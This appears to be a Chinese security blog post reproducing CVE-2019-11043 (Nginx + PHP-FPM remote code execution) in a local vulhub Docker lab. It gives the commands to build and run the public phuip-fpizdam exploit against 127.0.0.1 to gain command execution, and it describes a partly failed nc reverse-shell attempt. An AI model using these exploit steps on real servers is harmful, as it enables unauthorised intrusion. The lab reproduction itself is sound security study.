---
title: PHP远程代码执行漏洞复现（CVE-2019-11043）
layout: post
post-image: /assets/images/bg.jpg
description: CVE-2019-11043是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。
tags:
- 漏洞复现
- RCE
- 远程命令执行
---

# PHP远程代码执行漏洞复现（CVE-2019-11043）

漏洞描述：

CVE-2019-11043是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。

向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常。

该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下：

location ~ [ ^/ ] \ .php(/|$) {

 ...

 fastcgi_split_path_info ^(.+?\.php)(/.*)$;

fastcgi_param PATH_INFO $fastcgi_path_info;

fastcgi_pass   php:9000;

...

}

攻击者可以使用换行符（％0a）来破坏fastcgi_split_path_info指令中的Regexp。 Regexp被损坏导致PATH_INFO为空，同时slen可控，从而触发该漏洞。。

在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行，该漏洞影响的版本有：

PHP 7.0 版本

PHP 7.1 版本

PHP 7.2 版本

PHP 7.3 版本

## 漏洞复现：

使用docker环境进行复现。

#### 环境准备：

安装docker、golang环境：

apt-get install docker docker-compose

![image-20210817115556444](/assets/images/20210820/1.png)

apt install golang

![image-20210817115534582](/assets/images/20210820/2.png)

#### 搭建漏洞环境：

git clone https://github.com/vulhub/vulhub.git

![image-20210817130833304](/assets/images/20210820/3.png)

如果无法下载的话，建议使用科学下载

cd vulhub/php/CVE-2019-11043 && docker-compose up -d

![image-20210817131351893](/assets/images/20210820/4.png)

启动环境之后，就可以看到漏洞环境的默认页面。在此为 http://127.0.0.1:8080/index.php。

![image-20210813135844757](/assets/images/20210820/5.png)

#### 安装漏洞利用工具：

git clone https://github.com/neex/phuip-fpizdam.git

cd phuip-fpizdam

go get -v && go build

![image-20210817115259867](/assets/images/20210820/6.png)

产生报错是默认使用国外源proxy.golang.org，在国内无法访问。需要使用国内源，使用下面命令后重新下载                                       即可。

go env -w GOPROXY=https://goproxy.cn

![image-20210817115349636](/assets/images/20210820/7.png)

#### 漏洞利用：

运行编译生成的文件：

./phuip-fpizdam http://127.0.0.1:8080/index.php

![image-20210817131740996](/assets/images/20210820/8.png)

执行：

go run . "http://127.0.0.1:8080/index.php"

![image-20210817131946310](/assets/images/20210820/9.png)

访问网址http://127.0.0.1:8080/index.php，在后面直接加参数，即可执行命令。

![image-20210817132059652](/assets/images/20210820/10.png)

![image-20210817132157353](/assets/images/20210820/11.png)![image-20210817132304368](/assets/images/20210820/12.png)



### 反弹shell：

使用一下命令检查docker容器内是否有nc：

docker ps			//查看主机开启的docker容器

docker exec -it de3c7fd540f7 bash			//使用bash方式进入docker环境

docker exec -it de3c7fd540f7 sh				//使用sh方式进入docker环境

![image-20210817132815863](/assets/images/20210820/13.png)

经检查，在这里的docker容器里没有nc命令，所以需要给docker容器安装一个nc：

因为有两个docker镜像，一个是nginx，另一个是php，由于不知道具体哪一个容器可以反弹shell，所以一个一个试，显示nginx容器：

![image-20210817134221111](/assets/images/20210820/14.png)

进入nginx的容器，更新并安装nc：

![image-20210817134448244](/assets/images/20210820/15.png)

![image-20210817134609424](/assets/images/20210820/16.png)

此时，已在容器中安装好nc，退出容器，回到浏览器，使用nc本地监听的端口：

![image-20210817135033864](/assets/images/20210820/17.png)

![image-20210817135129899](/assets/images/20210820/18.png)

在这里没有监听到，我们换一个容器再试一次。

![image-20210817140206693](/assets/images/20210820/19.png)

其实当我看到这里的路径，就感觉到这次对了，接着继续下载nc：

![image-20210817140315069](/assets/images/20210820/20.png)

退出容器，回到浏览器，反弹到本地端口：

![image-20210817141539395](/assets/images/20210820/21.png)

![image-20210817141604207](/assets/images/20210820/22.png)

nc连接成功，试下反弹shell：

![image-20210817141905080](/assets/images/20210820/23.png)

这里出现报错，原因未知，下次有时间在看一下。
